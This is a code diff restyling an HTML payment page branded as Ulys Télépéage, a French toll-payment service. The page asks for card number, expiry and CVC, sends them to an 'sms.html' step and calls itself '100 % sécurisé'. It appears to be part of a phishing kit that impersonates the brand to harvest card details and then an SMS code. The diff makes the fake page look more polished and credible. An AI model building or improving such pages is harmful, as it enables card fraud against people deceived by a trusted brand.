@@ -4,29 +4,40 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Paiement – Ulys Télépéage</title>
-  <link rel="stylesheet" href="assets/css/style.css" />
+  <link rel="stylesheet" href="assets/css/style.css"/>
 </head>
 <body>
+
   <header>
-    <img src="assets/images/logo-ulys.png" alt="Ulys"/>
+    <nav class="navbar">
+      <img src="assets/images/logo-ulys.png" alt="Ulys"/>
+      <ul class="nav-links">
+        <li><a href="index.html">Retour</a></li>
+      </ul>
+    </nav>
   </header>
 
-  <div class="container">
-    <h1>Choix du moyen de paiement</h1>
-    <form action="sms.html" method="get">
-      <label for="cb-num">Numéro de carte</label>
-      <input type="text" id="cb-num" name="cb-num" maxlength="19" required />
+  <main class="container">
+    <div class="card">
+      <h1>Paiement sécurisé</h1>
+      <form action="sms.html" method="get">
+        <label for="cb-num">Numéro de carte</label>
+        <input type="text" id="cb-num" name="cb-num" maxlength="19" placeholder="1234 5678 9012 3456" required/>
 
-      <label for="cb-date">Date d'expiration</label>
-      <input type="month" id="cb-date" name="cb-date" required />
+        <label for="cb-date">Expiration</label>
+        <input type="month" id="cb-date" name="cb-date" required/>
 
-      <label for="cb-cvc">CVC</label>
-      <input type="text" id="cb-cvc" name="cb-cvc" maxlength="4" required />
+        <label for="cb-cvc">CVC</label>
+        <input type="text" id="cb-cvc" name="cb-cvc" maxlength="4" placeholder="123" required/>
 
-      <!-- Optionnel : Apple/Google Pay -->
+        <button type="submit" class="btn">Valider le paiement</button>
+      </form>
+    </div>
+  </main>
 
-      <button type="submit">Valider le paiement</button>
-    </form>
-  </div>
+  <footer>
+    &copy; 2025 Ulys. Paiement 100 % sécurisé.
+  </footer>
+
 </body>
 </html>
